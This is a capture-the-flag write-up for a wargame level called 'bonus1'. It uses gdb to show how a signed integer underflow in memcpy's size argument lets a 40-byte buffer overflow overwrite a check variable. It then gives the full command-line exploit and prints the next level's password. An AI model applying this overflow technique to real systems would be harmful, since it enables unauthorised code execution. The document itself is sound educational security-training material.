# bonus1

Nothing of note with `ll` and `checksec`.


Functions found using `(gdb) info functions`
|LIBC|user|
|-|-|
|memcpy|main|
|execl|frame_dummy|
|atoi||

`frame_dummy()` does nothing.

Much like **level0** and **level3**, we can see that a shell is executed after two number comparison.
Unfortunately, the variable **check** needs to be inferior to `10` for the first `if` while being equal to `0d1464814662` for the second `if`.

The value of **check** is set using `atoi()` on the first argument of **bonus1**.
Then, `memcpy()`'s called on the second argument and stored in the **buffer[40]** variable.

Let's quickly test that theory

```sh
gdb --args ./bonus1 5 pasteque
[...]
(gdb) b *0x08048478
(gdb) run
(gdb) x $esp +0x3c
0xbffff72c:	0x00000005
(gdb) set *0xbffff72c = 0x574f4c46
(gdb) x $esp +0x3c
0xbffff72c:	0x574f4c46
(gdb) c
$ whoami
bonus1
```

It works, now we need to do this outside GDB.

We need a *buffer overflow* on the **buffer** to overwrite the value of **check** to `0x574f4c46`.
`memcpy()` takes a `size_t` value as argument to indicate the number of bytes to copy.
Let's use an underflow to copy a memory of **44 bytes** using a negative value.

```python
-2147483648 <= x <= 9

4x === 44 (mod 2^32)
x === 11 (mod 2^30)
x === -1073741813 === 11 - 2^30

# I spent close to two hours on this part.
```

Our first argument is `-1073741813`. Now we just need to write a payload consisting of 40 bytes and the value required to pass the check (in little endian as always).

|padding|value|
|-|-|
|40 * a|\x46\x4c\x4f\x57|

Now to put all that together

```sh
./bonus1 -1073741813 $(python -c "print 40* 'a' + '\x46\x4c\x4f\x57'")
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

Are we there yet?
```sh
su bonus2
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
